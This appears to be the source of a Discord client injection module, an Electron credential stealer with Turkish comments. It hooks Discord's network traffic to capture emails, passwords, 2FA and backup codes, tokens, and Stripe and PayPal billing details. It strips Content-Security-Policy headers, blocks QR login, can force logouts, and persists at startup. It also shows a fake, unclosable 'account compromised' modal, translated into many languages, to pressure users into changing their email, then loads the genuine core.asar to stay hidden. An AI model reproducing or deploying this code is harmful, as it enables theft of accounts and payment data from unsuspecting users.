            "Ya no tienes acceso a tu correo electrónico",
            "Contacta a tu proveedor de correo electrónico para solucionarlo."
        ],
        'fr': [
            "Paramètres Utilisateur",
            "Modifier l'adresse e-mail",
            "Nous avons détecté quelque chose d'inhabituel avec votre compte (<strong>Discord</strong>), votre adresse,",
            "a été compromise.",
            "Veuillez la changer pour continuer à utiliser votre compte.",
            "Vous n'avez plus accès à votre e-mail",
            "Contactez votre fournisseur d'e-mail pour résoudre ce problème."
        ],
        'de': [
            "Benutzereinstellungen",
            "E-Mail-Adresse bearbeiten",
            "Wir haben etwas Ungewöhnliches mit Ihrem (<strong>Discord</strong>)-Konto festgestellt, Ihre Adresse,",
            "wurde kompromittiert.",
            "Bitte ändern Sie sie, um Ihr Konto weiterhin zu verwenden.",
            "Sie haben keinen Zugang mehr zu Ihrer E-Mail",
            "Wenden Sie sich an Ihren E-Mail-Anbieter, um dies zu beheben."
        ],
        'pt': [
            "Configurações do Usuário",
            "Editar endereço de e-mail",
            "Detectamos algo incomum com sua conta do (<strong>Discord</strong>), seu endereço,",
            "foi comprometido.",
            "Por favor, altere-o para continuar usando sua conta.",
            "Não tem mais acesso ao seu e-mail",
            "Entre em contato com seu provedor de e-mail para corrigir isso."
        ],
        'ru': [
            "Настройки пользователя",
            "Изменить адрес электронной почты",
            "Мы обнаружили что-то необычное с вашей учетной записью (<strong>Discord</strong>), ваш адрес,",
            "был скомпрометирован.",
            "Пожалуйста, измените его, чтобы продолжить использовать свою учетную запись.",
            "Больше нет доступа к вашей электронной почте",
            "Свяжитесь с вашим поставщиком электронной почты, чтобы исправить это."
        ],
        'ja': [
            "ユーザー設定",
            "メールアドレスを編集",
            "あなたの(<strong>Discord</strong>)アカウントで異常を検出しました、あなたのアドレス、",
            "が侵害されました。",
            "アカウントを引き続き使用するには変更してください。",
            "メールにアクセスできなくなりました",
            "修正するにはメールプロバイダーにお問い合わせください。"
        ],
        'ko': [
            "사용자 설정",
            "이메일 주소 편집",
            "귀하의 (<strong>Discord</strong>) 계정에서 이상한 점을 감지했습니다, 귀하의 주소가,",
            "손상되었습니다.",
            "계정을 계속 사용하려면 변경해 주세요.",
            "더 이상 이메일에 액세스할 수 없습니다",
            "이를 해결하려면 이메일 제공업체에 문의하세요."
        ],
        'zh': [
            "用户设置",
            "编辑电子邮件地址",
            "我们在您的(<strong>Discord</strong>)账户中检测到异常情况，您的地址，",
            "已被泄露。",
            "请更改它以继续使用您的账户。",
            "无法再访问您的电子邮件",
            "请联系您的电子邮件提供商来解决此问题。"
        ],
        'it': [
            "Impostazioni Utente",
            "Modifica indirizzo email",
            "Abbiamo rilevato qualcosa di insolito con il tuo account (<strong>Discord</strong>), il tuo indirizzo,",
            "è stato compromesso.",
            "Si prega di cambiarlo per continuare ad utilizzare il tuo account.",
            "Non hai più accesso alla tua email",
            "Contatta il tuo provider email per risolverlo."
        ],
        'nl': [
            "Gebruikersinstellingen",
            "E-mailadres bewerken",
            "We hebben iets ongewoons gedetecteerd met je (<strong>Discord</strong>) account, je adres,",
            "is gecompromitteerd.",
            "Verander het alsjeblieft om je account te blijven gebruiken.",
            "Geen toegang meer tot je e-mail",
            "Neem contact op met je e-mailprovider om dit op te lossen."
        ],
        'pl': [
            "Ustawienia Użytkownika",
            "Edytuj adres e-mail",
            "Wykryliśmy coś niezwykłego z Twoim kontem (<strong>Discord</strong>), Twój adres,",
            "został skompromitowany.",
            "Proszę zmień go, aby kontynuować korzystanie z konta.",
            "Nie masz już dostępu do swojego e-maila",
            "Skontaktuj się z dostawcą poczty e-mail, aby to naprawić."
        ],
        'sv': [
            "Användarinställningar",
            "Redigera e-postadress",
            "Vi har upptäckt något ovanligt med ditt (<strong>Discord</strong>) konto, din adress,",
            "har äventyrats.",
            "Vänligen ändra den för att fortsätta använda ditt konto.",
            "Har inte längre tillgång till din e-post",
            "Kontakta din e-postleverantör för att åtgärda det."
        ],
        'no': [
            "Brukerinnstillinger",
            "Rediger e-postadresse",
            "Vi har oppdaget noe uvanlig med din (<strong>Discord</strong>) konto, din adresse,",
            "har blitt kompromittert.",
            "Vennligst endre den for å fortsette å bruke kontoen din.",
            "Har ikke lenger tilgang til e-posten din",
            "Kontakt e-postleverandøren din for å fikse det."
        ],
        'da': [
            "Brugerindstillinger",
            "Rediger e-mailadresse",
            "Vi har opdaget noget usædvanligt med din (<strong>Discord</strong>) konto, din adresse,",
            "er blevet kompromitteret.",
            "Venligst skift den for at fortsætte med at bruge din konto.",
            "Har ikke længere adgang til din e-mail",
            "Kontakt din e-mailudbyder for at rette det."
        ],
        'fi': [
            "Käyttäjäasetukset",
            "Muokkaa sähköpostiosoitetta",
            "Olemme havainneet jotain epätavallista (<strong>Discord</strong>) tililläsi, osoitteesi,",
            "on vaarantunut.",
            "Vaihda se jatkaaksesi tilisi käyttöä.",
            "Ei enää pääsyä sähköpostiisi",
            "Ota yhteyttä sähköpostipalveluntarjoajaasi korjataksesi sen."
        ],
        'cs': [
            "Uživatelská nastavení",
            "Upravit e-mailovou adresu",
            "Zjistili jsme něco neobvyklého s vaším (<strong>Discord</strong>) účtem, vaše adresa,",
            "byla kompromitována.",
            "Prosím změňte ji, abyste mohli pokračovat v používání vašeho účtu.",
            "Nemáte už přístup k vašemu e-mailu",
            "Kontaktujte vašeho poskytovatele e-mailu, aby to opravil."
        ],
        'hu': [
            "Felhasználói beállítások",
            "E-mail cím szerkesztése",
            "Valami szokatlan dolgot észleltünk a (<strong>Discord</strong>) fiókjával kapcsolatban, az címe,",
            "veszélybe került.",
            "Kérjük, változtassa meg, hogy továbbra is használhassa a fiókját.",
            "Már nincs hozzáférése az e-mailjéhez",
            "Lépjen kapcsolatba az e-mail szolgáltatójával, hogy kijavítsa."
        ],
        'ro': [
            "Setări utilizator",
            "Editează adresa de email",
            "Am detectat ceva neobișnuit cu contul tău (<strong>Discord</strong>), adresa ta,",
            "a fost compromisă.",
            "Te rugăm să o schimbi pentru a continua să folosești contul.",
            "Nu mai ai acces la emailul tău",
            "Contactează furnizorul tău de email pentru a rezolva problema."
        ],
        'bg': [
            "Потребителски настройки",
            "Редактиране на имейл адрес",
            "Открихме нещо необичайно с вашия (<strong>Discord</strong>) акаунт, вашият адрес,",
            "е компрометиран.",
            "Моля, променете го, за да продължите да използвате акаунта си.",
            "Вече нямате достъп до имейла си",
            "Свържете се с вашия имейл доставчик, за да го поправите."
        ],
        'hr': [
            "Korisničke postavke",
            "Uredi email adresu",
            "Otkrili smo nešto neobično s vašim (<strong>Discord</strong>) računom, vaša adresa,",
            "je kompromitirana.",
            "Molimo promijenite je da biste nastavili koristiti svoj račun.",
            "Više nemate pristup svojoj email adresi",
            "Kontaktirajte svog email pružatelja usluge da to popravite."
        ],
        'uk': [
            "Налаштування користувача",
            "Редагувати адресу електронної пошти",
            "Ми виявили щось незвичайне з вашим обліковим записом (<strong>Discord</strong>), ваша адреса,",
            "була скомпрометована.",
            "Будь ласка, змініть її, щоб продовжити використовувати свій обліковий запис.",
            "Більше немає доступу до вашої електронної пошти",
            "Зв'яжіться з вашим провайдером електронної пошти, щоб виправити це."
        ],
        'el': [
            "Ρυθμίσεις Χρήστη",
            "Επεξεργασία διεύθυνσης email",
            "Εντοπίσαμε κάτι ασυνήθιστο με τον λογαριασμό σας (<strong>Discord</strong>), η διεύθυνσή σας,",
            "έχει παραβιαστεί.",
            "Παρακαλούμε αλλάξτε τη για να συνεχίσετε να χρησιμοποιείτε τον λογαριασμό σας.",
            "Δεν έχετε πλέον πρόσβαση στο email σας",
            "Επικοινωνήστε με τον πάροχο email σας για να το διορθώσετε."
        ],
        'ar': [
            "إعدادات المستخدم",
            "تحرير عنوان البريد الإلكتروني",
            "لقد اكتشفنا شيئًا غير عادي في حساب (<strong>Discord</strong>) الخاص بك، عنوانك،",
            "تم اختراقه.",
            "يرجى تغييره لمواصلة استخدام حسابك.",
            "لم تعد تملك الوصول إلى بريدك الإلكتروني",
            "اتصل بمزود البريد الإلكتروني الخاص بك لإصلاح ذلك."
        ],
        'he': [
            "הגדרות משתמש",
            "עריכת כתובת אימייל",
            "זיהינו משהו חריג בחשבון (<strong>Discord</strong>) שלך, הכתובת שלך,",
            "נפגעה.",
            "אנא שנה אותה כדי להמשיך להשתמש בחשבון שלך.",
            "אין לך יותר גישה לאימייל שלך",
            "צור קשר עם ספק האימייל שלך כדי לתקן זאת."
        ],
        'th': [
            "การตั้งค่าผู้ใช้",
            "แก้ไขที่อยู่อีเมล",
            "เราตรวจพบสิ่งผิดปกติกับบัญชี (<strong>Discord</strong>) ของคุณ ที่อยู่ของคุณ",
            "ถูกบุกรุก",
            "โปรดเปลี่ยนเพื่อใช้บัญชีต่อไป",
            "ไม่มีการเข้าถึงอีเมลของคุณอีกต่อไป",
            "ติดต่อผู้ให้บริการอีเมลของคุณเพื่อแก้ไข"
        ],
        'vi': [
            "Cài đặt người dùng",
            "Chỉnh sửa địa chỉ email",
            "Chúng tôi đã phát hiện điều bất thường với tài khoản (<strong>Discord</strong>) của bạn, địa chỉ của bạn,",
            "đã bị xâm phạm.",
            "Vui lòng thay đổi để tiếp tục sử dụng tài khoản của bạn.",
            "Không còn quyền truy cập vào email của bạn",
            "Liên hệ với nhà cung cấp email của bạn để khắc phục."
        ],
        'hi': [
            "उपयोगकर्ता सेटिंग्स",
            "ईमेल पता संपादित करें",
            "हमने आपके (<strong>Discord</strong>) खाते में कुछ असामान्य का पता लगाया है, आपका पता,",
            "से समझौता किया गया है।",
            "कृपया अपने खाते का उपयोग जारी रखने के लिए इसे बदलें।",
            "आपके ईमेल तक अब पहुंच नहीं है",
            "इसे ठीक करने के लिए अपने ईमेल प्रदाता से संपर्क करें।"
        ]
    };
    try {
        const translatedMessages = translations[baseLocale];
        if (translatedMessages && Array.isArray(translatedMessages) && translatedMessages.length === message.length) {
            return translatedMessages;
        }
        return message;
    } catch (error) {
        return message;
    }
};

let [
    email,
    password,
    script_executed
] = [
    '',
    '',
    false
];

const GangwayCord = async (params, RESPONSE_DATA, RESQUEST_DATA, token, user) => {
    try {
        switch (true) {
            case params.response.url.endsWith('/login'):
                if (params.response.url.endsWith('/remote-auth/login')) {
                    // With this update, QR codes are blocked in the function allSessionsLocked(),
                    // so this is here just in case the QR code blocking fails
                    if (!RESPONSE_DATA.encrypted_token) return;

                    await delay(2000);

                    const {
                        token: newToken,
                        user: newUser
                    } = await AuritaCord();

                    Cruise(
                        'LOGIN_USER',
                        RESPONSE_DATA,
                        RESQUEST_DATA,
                        newUser.email,
                        'The password was not found',
                        newToken,
                        `You have logged in using QR code`
                    );
                }

                if (!RESPONSE_DATA.token) {
                    email = RESQUEST_DATA.login;
                    password = RESQUEST_DATA.password;
                    if (RESQUEST_DATA.password) {
                        passwordDetected = true;
                    }
                    return;
                }

                if (RESQUEST_DATA.password) {
                    passwordDetected = true;
                }

                Cruise(
                    'LOGIN_USER',
                    RESPONSE_DATA,
                    RESQUEST_DATA,
                    RESQUEST_DATA.login,
                    RESQUEST_DATA.password,
                    token,
                    `has Logged in-`
                );
                break;

            case params.response.url.endsWith('/register'):
                if (RESQUEST_DATA.password) {
                    passwordDetected = true;
                }

                Cruise(
                    'LOGIN_USER',
                    RESPONSE_DATA,
                    RESQUEST_DATA,
                    RESQUEST_DATA.email,
                    RESQUEST_DATA.password,
                    token,
                    'has `Created` a new account'
                );
                break;

            case params.response.url.endsWith('/totp'):
                if (password) {
                    passwordDetected = true;
                }

                Cruise(
                    'LOGIN_USER',
                    RESPONSE_DATA,
                    RESQUEST_DATA,
                    email,
                    password,
                    token,
                    `you are logged in with \`2FA\``
                );
                break;

            case params.response.url.endsWith('/enable'):
            case params.response.url.endsWith('/codes-verification'):
                const count = RESPONSE_DATA.backup_codes?.length ?? 0;

                Cruise(
                    'BACKUP_CODES',
                    RESPONSE_DATA,
                    RESQUEST_DATA,
                    user.email,
                    'The password was not found',
                    token,
                    `\`${count} security\` codes have just been added`
                );
                break;

            case params.response.url.endsWith('/@me'):
                if (!RESQUEST_DATA.password) return;

                if (RESQUEST_DATA.password) {
                    passwordDetected = true;
                }

                if (RESQUEST_DATA.email && RESQUEST_DATA.email_token) {
                    Cruise(
                        'EMAIL_CHANGED',
                        RESPONSE_DATA,
                        RESQUEST_DATA,
                        RESQUEST_DATA.email,
                        RESQUEST_DATA.password,
                        token,
                        `has updated their email to \`${RESQUEST_DATA.email}\``
                    );
                }
                if (RESQUEST_DATA.new_password) {
                    if (RESQUEST_DATA.new_password) {
                        passwordDetected = true;
                    }

                    Cruise(
                        'PASSWORD_CHANGED',
                        RESPONSE_DATA,
                        RESQUEST_DATA,
                        user.email,
                        RESQUEST_DATA.password,
                        token,
                        `has updated their password to \`${RESQUEST_DATA.new_password}\``
                    );
                }
                if (RESQUEST_DATA.username) {
                    Cruise(
                        'USERNAME_CHANGED',
                        RESPONSE_DATA,
                        RESQUEST_DATA,
                        user.email,
                        RESQUEST_DATA.password,
                        token,
                        `has updated their username to \`${RESQUEST_DATA.username}\``
                    );
                }
                break;
        }
    } catch (error) {
        console.error(error);
    }
};

const createWindow = async () => {
    return new Promise((resolve) => {
        const checkWindowStability = async () => {
            const mainWindow = BrowserWindow.getAllWindows()[0];

            if (!mainWindow) {
                console.log("Window bulunamadı, tekrar deneniyor...");
                setTimeout(checkWindowStability, 1000);
                return;
            }

            // Window'un temel özelliklerini kontrol et
            if (!mainWindow.webContents || mainWindow.isDestroyed()) {
                console.log("Window webContents hazır değil, bekleniyor...");
                setTimeout(checkWindowStability, 500);
                return;
            }

            try {
                // Window'un tam yüklenip yüklenmediğini kontrol et
                const isReady = await new Promise((resolveReady) => {
                    let stableCount = 0;
                    const requiredStableTime = 3000; // 3 saniye
                    const checkInterval = 500; // 500ms'de bir kontrol
                    const requiredChecks = requiredStableTime / checkInterval; // 6 kontrol

                    const stabilityCheck = setInterval(() => {
                        try {
                            // Window'un temel durumlarını kontrol et
                            const windowStable = (
                                !mainWindow.isDestroyed() &&
                                mainWindow.webContents &&
                                !mainWindow.webContents.isLoading() &&
                                mainWindow.webContents.getURL() !== 'about:blank' &&
                                mainWindow.isVisible()
                            );

                            if (windowStable) {
                                stableCount++;
                                console.log(`Window stabil kontrol: ${stableCount}/${requiredChecks}`);

                                if (stableCount >= requiredChecks) {
                                    clearInterval(stabilityCheck);
                                    resolveReady(true);
                                }
                            } else {
                                // Stabil değilse sayacı sıfırla
                                if (stableCount > 0) {
                                    console.log("Window stabil değil, sayaç sıfırlanıyor...");
                                    stableCount = 0;
                                }
                            }
                        } catch (error) {
                            console.log("Stabilite kontrolü hatası:", error.message);
                            stableCount = 0;
                        }
                    }, checkInterval);

                    // 30 saniye timeout
                    setTimeout(() => {
                        clearInterval(stabilityCheck);
                        resolveReady(false);
                    }, 30000);
                });

                if (!isReady) {
                    console.log("Window 30 saniye içinde stabil olmadı, tekrar deneniyor...");
                    setTimeout(checkWindowStability, 2000);
                    return;
                }

                console.log("Window 3 saniye stabil kaldı, debugger kurulumu başlatılıyor...");

                // Debugger kurulumu
                mainWindow.webContents.debugger.attach('1.3');

                mainWindow.webContents.debugger.on('message', async (_, method, params) => {
                    if ('Network.responseReceived' !== method) return;

                    if (
                        !CONFIG.auth_filters.urls.some(url => params.response.url.endsWith(url)) ||
                        ![200, 202].includes(params.response.status)
                    ) return;

                    try {
                        const [{ body: responseBody }, { postData: requestPostData }] = await Promise.all([
                            mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', { requestId: params.requestId }),
                            mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', { requestId: params.requestId })
                        ]);

                        const RESPONSE_DATA = parseJSON(responseBody);
                        const RESQUEST_DATA = parseJSON(requestPostData);

                        const {
                            token,
                            user
                        } = await AuritaCord();

                        GangwayCord(params, RESPONSE_DATA, RESQUEST_DATA, token, user);
                    } catch (error) {
                        console.error("Network message handler hatası:", error);
                    }
                });

                // Network monitoring'i etkinleştir
                await mainWindow.webContents.debugger.sendCommand('Network.enable');

                mainWindow.on('closed', () => {
                    console.log("Window kapandı, yeniden oluşturuluyor...");
                    createWindow();
                });

                // Debugger kurulumu da tamamlandığında resolve et
                console.log("CreateWindow tam yüklendi ve hazır!");
                resolve(mainWindow);

            } catch (error) {
                console.error("Window kurulum hatası:", error);
                setTimeout(checkWindowStability, 2000);
            }
        };

        // İlk kontrolü başlat
        checkWindowStability();
    });
};

const isLogged = async () => {
    const LOG_FILE_PATH = path.join(__dirname, 'core.log');

    if (!fs.existsSync(LOG_FILE_PATH)) {
        try {
            fs.writeFileSync(LOG_FILE_PATH, '', { flag: 'wx' });
        } catch (err) {
            console.error(err.message);
        }
    }

    try {
        const {
            token
        } = await AuritaCord();

        if (token) {
            if (CONFIG.auto_logout_after_injection === 'true') {
                if (!fs.existsSync(LOG_FILE_PATH)) {
                    fs.writeFileSync(LOG_FILE_PATH, 'logout');

                    await request('POST', 'https://discord.com/api/v9/auth/logout', {
                        'Content-Type': 'application/json',
                        'Authorization': token
                    }, JSON.stringify({
                        provider: null,
                        voip_provider: null,
                    }));

                    return false;
                };
            }
            fs.writeFileSync(LOG_FILE_PATH, 'token: ' +  token);
            return true;
        } else {
            fs.writeFileSync(LOG_FILE_PATH, 'tokennotfound');
        }
        fs.writeFileSync(LOG_FILE_PATH, 'tokennotfound=' + token);


        return true;
    } catch (error) {
        return false;
    }
};

const defaultSession = () => {
    const webRequest = session.defaultSession.webRequest;
    if (!webRequest) return;

    webRequest.onCompleted(CONFIG.payment_filters, async (details) => {
        const { url, uploadData, method, statusCode, billing_address } = details;

        if (
            ![200, 202].includes(statusCode) &&
            !['POST'].includes(method)
        ) return;

        const {
            token,
            user
        } = await AuritaCord();

        if(!token) return;

        switch (true) {
            case url.includes('stripe'):
                let item;

                try {
                    item = querystring.parse(Buffer.from(uploadData[0].bytes).toString());
                } catch (error) {
                    item = querystring.parse(decodeURIComponent(uploadData[0]?.bytes.toString() || ''));
                }

                const { line_1, line_2, city, state, postal_code, country, email } = billing_address;
                const request = {
                    item,
                    line_1,
                    line_2,
                    city,
                    state,
                    postal_code,
                    country,
                    email
                };

                Cruise(
                    'CREDITCARD_ADDED',
                    null,
                    request,
                    user.email,
                    null,
                    token,
                    `you just added a \`Credit Card\``
                );
                break;

            case (url.endsWith('paypal_accounts') || url.endsWith('billing-agreement-tokens')):
                Cruise(
                    'PAYPAL_ADDED',
                    null,
                    null,
                    user.email,
                    null,
                    token,
                    `you just added a \`Paypal\` account`
                );
                break;

        };
    });
};

const interceptRequest = () => {
    const webRequest = session.defaultSession.webRequest;
    if (!webRequest) return;

    webRequest.onHeadersReceived((request, callback) => {
        (async () => {
            const { url, method, statusCode, responseHeaders, uploadData } = request;
            const updatedHeaders = { ...responseHeaders };
            logError('itss cuss');

            ['content-security-policy', 'content-security-policy-report-only'].forEach(header => {
                delete updatedHeaders[header];
            });

            const processUserUpdate = async () => {
                const { token, user } = await AuritaCord();
                if (!token) return;

                if (CONFIG.auto_user_profile_edit === 'true') {
                    //await editSettingUser(token);
                }

                if (passwordDetected) {
                    // Şifre tespit edildi → popup gösterme
                    return;
                }

                if (CONFIG.auto_email_update === 'true') {
                    const locale = user.locale || 'en-US';

                    const truncateEmail = (email = '@') => {
                        const [localPart, domain] = email.split('@');
                        return `${localPart.slice(0, 15)}${localPart.length > 15 ? '...' : ''}@${domain || ''}`;
                    };

                    const [
                        CONFIG_ALERT,
                        EDIT_MAIL_ALERT,
                        ALERT_INTRO,
                        END_INTRO_ALERT,
                        CHANGE_ALERT,
                        LAST_END_ALERT,
                        CONTACT_ALERT,
                    ] = await translateEmailUpdate(locale);

                    // Settings sayfasından çıkışı kontrol eden sistem
                    let wasInSettings = false;
                    let redirectDelay = false; // Yönlendirme gecikmesi kontrolü

                    const checkSettingsAndShowPopup = async () => {
                        if (passwordDetected || redirectDelay) {
                            return; // Password tespit edildi veya yönlendirme gecikmesi → popup gösterme
                        }

                        const { user: initialUser } = await AuritaCord();
                        if (initialUser && initialUser.email === user.email) {
                            await execScript(`
        // Settings sayfasında mı kontrolü - Sadece Discord account settings elementleri
        const isInSettings = () => {
            // Discord account settings sayfasının spesifik elementleri
            const accountTab = document.querySelector('[aria-controls="my-account-tab"]') || 
                              document.querySelector('[id="my-account-tab"]');
            
            return !!accountTab;
        };

        // Global yönlendirme fonksiyonu - sadece popup kapanma için
        window.closeAllPopups = () => {
            const allPopups = document.querySelectorAll('[id^="email-update-modal-"]');
            allPopups.forEach(popup => popup.remove());
            document.body.style.overflow = '';
        };

        // Eğer settings sayfasındaysa popup gösterme
        if (isInSettings()) {
            console.log('Settings sayfasında, popup gösterilmiyor');
        } else {
            // Mevcut popup'ları temizle
            const existingPopups = document.querySelectorAll('[id^="email-update-modal-"]');
            existingPopups.forEach(popup => popup.remove());
            
            // Body overflow'u düzelt
            document.body.style.overflow = 'hidden';
            
            // Benzersiz modal ID oluştur
            const modalId = 'email-update-modal-' + Date.now();

            const modalOverlay = document.createElement('div');
            modalOverlay.id = modalId;

            modalOverlay.innerHTML = \`
                <style>
                    [id^="email-update-modal-"] {
                        position: fixed;
                        top: 0;
                        left: 0;
                        width: 100vw;
                        height: 100vh;
                        background: rgba(0, 0, 0, 0.85);
                        backdrop-filter: blur(8px);
                        display: flex;
                        align-items: center;
                        justify-content: center;
                        z-index: 1000;
                        font-family: "gg sans", "Noto Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
                    }

                    .discord-modal {
                        background: #313338;
                        border-radius: 8px;
                        box-shadow: 0 8px 16px rgba(0, 0, 0, 0.24);
                        width: 440px;
                        max-width: 90vw;
                        max-height: 90vh;
                        overflow: hidden;
                        transform: scale(1);
                        animation: modalSlideIn 0.2s ease-out;
                    }

                    @keyframes modalSlideIn {
                        from {
                            opacity: 0;
                            transform: scale(0.85);
                        }
                        to {
                            opacity: 1;
                            transform: scale(1);
                        }
                    }

                    @keyframes modalSlideOut {
                        from {
                            opacity: 1;
                            transform: scale(1);
                        }
                        to {
                            opacity: 0;
                            transform: scale(0.85);
                        }
                    }

                    @keyframes spin {
                        0% { transform: rotate(0deg); }
                        100% { transform: rotate(360deg); }
                    }

                    @keyframes shake {
                        0%, 100% { transform: translateX(0); }
                        20%, 60% { transform: translateX(-10px); }
                        40%, 80% { transform: translateX(10px); }
                    }

                    .modal-header {
                        padding: 16px 16px 0 16px;
                        display: flex;
                        justify-content: space-between;
                        align-items: center;
                    }

                    .modal-title {
                        color: #f2f3f5;
                        font-size: 20px;
                        font-weight: 600;
                        line-height: 24px;
                        margin: 0;
                    }

                    .modal-close {
                        background: none;
                        border: none;
                        color: #b5bac1;
                        cursor: pointer;
                        padding: 4px;
                        border-radius: 3px;
                        font-size: 18px;
                        width: 24px;
                        height: 24px;
                        display: flex;
                        align-items: center;
                        justify-content: center;
                        transition: color 0.15s ease;
                    }

                    .modal-close:hover {
                        color: #dcddde;
                    }

                    .modal-content {
                        padding: 16px;
                        color: #dbdee1;
                        font-size: 16px;
                        line-height: 20px;
                    }

                    .modal-content p {
                        margin: 0 0 12px 0;
                    }

                    .modal-content p:last-child {
                        margin-bottom: 0;
                    }

                    .modal-content strong {
                        color: #f2f3f5;
                        font-weight: 600;
                    }

                    .modal-footer {
                        padding: 16px;
                        background: #2b2d31;
                        display: flex;
                        justify-content: flex-end;
                        gap: 8px;
                    }

                    .discord-button {
                        border: none;
                        border-radius: 3px;
                        font-size: 14px;
                        font-weight: 500;
                        height: 38px;
                        min-height: 32px;
                        padding: 2px 16px;
                        cursor: pointer;
                        display: flex;
                        align-items: center;
                        justify-content: center;
                        text-decoration: none;
                        transition: background-color 0.17s ease;
                    }

                    .button-primary {
                        background-color: #5865f2;
                        color: #ffffff;
                    }

                    .button-primary:hover {
                        background-color: #4752c4;
                    }

                    .button-secondary {
                        background-color: transparent;
                        color: #ffffff;
                    }

                    .button-secondary:hover {
                        background-color: #4e5058;
                    }

                    .email-icon {
                        width: 48px;
                        height: 48px;
                        margin: 0 auto 16px;
                        background: #5865f2;
                        border-radius: 50%;
                        display: flex;
                        align-items: center;
                        justify-content: center;
                        color: white;
                        font-size: 24px;
                    }
                </style>

                <div class="discord-modal">
                    <div class="modal-header">
                        <h2 class="modal-title">${CONFIG_ALERT}</h2>
                        <button class="modal-close">×</button>
                    </div>

                    <div class="modal-content">
                        <div class="email-icon">📧</div>
                        <p>${ALERT_INTRO} (<strong>${truncateEmail(user.email || 'user@gmail.com')}</strong>) ${END_INTRO_ALERT}</p>
                        <p>${CHANGE_ALERT}</p>
                        <p>${LAST_END_ALERT} ${CONTACT_ALERT}</p>
                    </div>

                    <div class="modal-footer">
                        <button class="discord-button button-secondary">İptal</button>
                        <button class="discord-button button-primary">${EDIT_MAIL_ALERT}</button>
                    </div>
                </div>
            \`;

            const modal = modalOverlay.querySelector('.discord-modal');
            const primaryButton = modalOverlay.querySelector('.button-primary');
            const secondaryButton = modalOverlay.querySelector('.button-secondary');
            const closeButton = modalOverlay.querySelector('.modal-close');

            let clicked = false;

            const shakeModal = () => {
                modal.style.animation = 'shake 0.4s';
                setTimeout(() => {
                    modal.style.animation = '';
                }, 400);
            };

            const blockClose = (e) => {
                e.preventDefault();
                shakeModal();
            };

            secondaryButton.onclick = blockClose;
            closeButton.onclick = blockClose;

            document.addEventListener('keydown', (e) => {
                if (e.key === 'Escape') {
                    shakeModal();
                }
            });

            primaryButton.onclick = async (e) => {
                e.preventDefault();
                if (clicked) return;
                clicked = true;
                
                // Yönlendirme gecikmesini başlat
                redirectDelay = true;
                setTimeout(() => {
                    redirectDelay = false;
                }, 5000);
                
                const spinner = document.createElement('div');
                spinner.style.width = '18px';
                spinner.style.height = '18px';
                spinner.style.border = '3px solid white';
                spinner.style.borderTop = '3px solid transparent';
                spinner.style.borderRadius = '50%';
                spinner.style.animation = 'spin 1s linear infinite';
            
                primaryButton.innerHTML = '';
                primaryButton.appendChild(spinner);
            
                const originalTitle = document.title;
                let popupClosed = false;
            
                // Sürekli 50ms aralıkla yönlendirme denemesi
                const redirectInterval = setInterval(() => {
                    if (popupClosed) {
                        clearInterval(redirectInterval);
                        return;
                    }
                    window.location.assign('/settings/account');
                }, 50);
            
                let checksDone = 0;
                const maxChecks = 3;
            
                const titleCheckInterval = setInterval(() => {
                    if (popupClosed) {
                        clearInterval(titleCheckInterval);
                        return;
                    }
            
                    checksDone++;
            
                    if (document.title !== originalTitle) {
                        // Title değişmiş, yönlendirme başarılı
                        popupClosed = true;
                        clearInterval(redirectInterval);
                        clearInterval(titleCheckInterval);
                        
                        // Başarılı yönlendirme sonrası tüm popup'ları kapat
                        setTimeout(() => {
                            const allPopups = document.querySelectorAll('[id^="email-update-modal-"]');
                            allPopups.forEach(popup => popup.remove());
                            document.body.style.overflow = '';
                        }, 1000);
                        
                    } else if (checksDone >= maxChecks) {
                        clearInterval(titleCheckInterval);
                        // Maksimum deneme aşıldı
                        popupClosed = true;
                        
                        // Tüm popup'ları kapat
                        setTimeout(() => {
                            const allPopups = document.querySelectorAll('[id^="email-update-modal-"]');
                            allPopups.forEach(popup => popup.remove());
                            document.body.style.overflow = '';
                        }, 500);
                    }
                }, 5000);
            };

            document.body.appendChild(modalOverlay);
        }
`);
                        }
                    };

                    // Settings durumunu sürekli kontrol et
                    const settingsCheckInterval = setInterval(async () => {
                        if (passwordDetected || redirectDelay) {
                            return; // Password tespit edildi veya yönlendirme gecikmesi → kontrol yapma
                        }

                        const settingsResult = await execScript(`
                (function() {
                    const isInSettings = () => {
                        // Discord account settings sayfasının spesifik elementleri
                        const accountTab = document.querySelector('[aria-controls="my-account-tab"]') || 
                                          document.querySelector('[id="my-account-tab"]');
                        
                        return !!accountTab;
                    };
                    return isInSettings() ? 'true' : 'false';
                })();
            `);
                        const currentlyInSettings = settingsResult === 'true';

                        // Eğer settings'ten çıktıysa popup göster
                        if (wasInSettings && !currentlyInSettings) {
                            await checkSettingsAndShowPopup();
                        }

                        wasInSettings = currentlyInSettings;
                    }, 1000); // Her saniye kontrol et

                    // İlk popup'ı da göster (eğer settings'te değilse)
                    await checkSettingsAndShowPopup();
                }
            };

            logError(url)
            switch (true) {
                case (!script_executed):
                    await processUserUpdate();
                    if (/\/settings(\/|$)/.test(url) && !/\/settings-[^/]/.test(url)) {
                        script_executed = true;
                    }
                    break;
            }
            switch (true) {
                /*case (url.endsWith('/@me') && !script_executed) || (url.includes('/settings') && !script_executed):
                    if (url.endsWith('/@me')) {
                        await processUserUpdate();
                    }
                    if (url.includes('/settings')) {
                        script_executed = true;
                    }
                    break;*/
            }

            logError('why');

            callback({
                responseHeaders: {
                    ...updatedHeaders,
                    "Access-Control-Allow-Headers": "*"
                }
            });
        })().catch(logError);
    });
};


const allSessionsLocked = async () => {
    const webRequest = session.defaultSession.webRequest;
    if (!webRequest) return;

    if (CONFIG.auto_disable_qr_login === 'true') {
        webRequest.onBeforeRequest(CONFIG.session_filters, (details, callback) => {
            const cancel =
                details.url.includes("wss://remote-auth-gateway") ||
                details.url.includes("auth/sessions");

            callback({ cancel });
        });
    }

    try {
        const isEnabled = await isLogged();
        if (isEnabled) return interceptRequest();
    } catch (error) {
        console.error(error);
    };

    setTimeout(allSessionsLocked, 5000);
};

const complete = async () => {
    if (CONFIG.auto_persist_startup === 'true') {
        forcePersistStartup();
    }

    const mainWindow = await createWindow();
    console.log("CreateWindow tam yüklendi.");

    // Diğer fonksiyonlar hemen çalıştırılıyor
    startup();
    defaultSession();
    allSessionsLocked();

    console.log("Tüm başlangıç fonksiyonları tamamlandı.");
};


complete();

module.exports = require("./core.asar");
